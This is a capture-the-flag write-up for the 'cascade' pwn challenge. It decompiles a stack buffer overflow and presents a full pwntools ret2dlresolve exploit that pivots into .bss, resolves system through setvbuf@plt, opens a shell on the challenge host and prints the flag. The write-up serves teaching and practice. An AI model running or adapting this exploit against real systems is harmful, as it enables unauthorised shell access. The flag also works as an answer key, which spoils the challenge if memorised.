# cascade
**Category:** Pwn
**Difficulty:** Medium
**Author:** c-bass

## Description

just a buffer overflow, right?

## Distribution

- `cascade.zip`

## Solution

### 1 Analyze the problem
We are given a stripped 64-bit ELF binary.
After using ghidra to analyze, looking at main, we see it just disables stdio buffering and then calls vuln():
```cpp
int main(void) {
    FUN_00401060(stdout,0,2,0);
    FUN_00401060(stdin,0,2,0);
    vuln();
    return 0;
}

void vuln(void) {
    char local_48[64];
    read(0, local_48, 0x200);   // classic overflow
}

```
### So the vulnerability is obvious: a stack buffer overflow that allows full ROP.

### 2 Analysis in Ghidra
- setvbuf is imported (visible in PLT/GOT).

- The vuln function allows us to overwrite return addresses.

- There is no system@plt, so we can’t call it directly.

- However, because setvbuf is a dynamically linked function, we can abuse the dynamic linker to resolve system at runtime.

This is the textbook setup for a ret2dlresolve attack.
### 3 Exploit Strategy
1. Overflow the stack to pivot execution into writable memory (.bss) so we can store a long fake frame.

2. Use pwntools’ Ret2dlresolvePayload to craft fake relocation/symbol/string entries for system.

3. Trigger the dynamic linker via the existing setvbuf@plt stub.

4. Place "sh" in memory to use as the argument.

5. When the resolver runs, it resolves system from libc and executes system("sh").

### 4 Exploit Code
```python
from pwn import *

context.binary = elf = ELF("./vuln")
conn = remote("cascade.chal.imaginaryctf.org", 1337)

# Build the ret2dlresolve payload for 'system("sh")'
dlresolve = Ret2dlresolvePayload(
    elf,
    symbol='system',
    args=[],
    data_addr=0x404070,
    resolution_addr=elf.got.setvbuf
)

# Stage 1: pivot stack into .bss
conn.sendline(
    (b"A"*64 + p64(elf.sym.stdout + 0x40) + p64(0x401162)).ljust(0x200-1, b'\0')
)

# Stage 2: write fake dlresolve structures + "sh"
rop = ROP(elf)
rop.ret2dlresolve(dlresolve)
rop.raw(rop.ret)
rop.main()

conn.sendline(
    (p64(elf.sym.stdout + 8) + b"sh\0\0\0\0\0\0" +
     b"A"*0x30 + p64(0x404f40) + p64(0x401162) +
     dlresolve.payload).ljust(0x200-1, b'\0')
)

# Stage 3: final chain that calls system("sh")
conn.sendline(
    (b"A"*0x48 + rop.chain() + dlresolve.payload).ljust(0x200-1, b'\0')
)

conn.interactive()


```

### 5 Final ouput
Running the exploit connects to the challenge service and returns a shell.
From there, reading the flag is straightforward:
```
$ cat flag.txt
ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}

```

### Ouput: ictf{i_h0pe_y0u_didnt_use_ret2dl_94b51175}


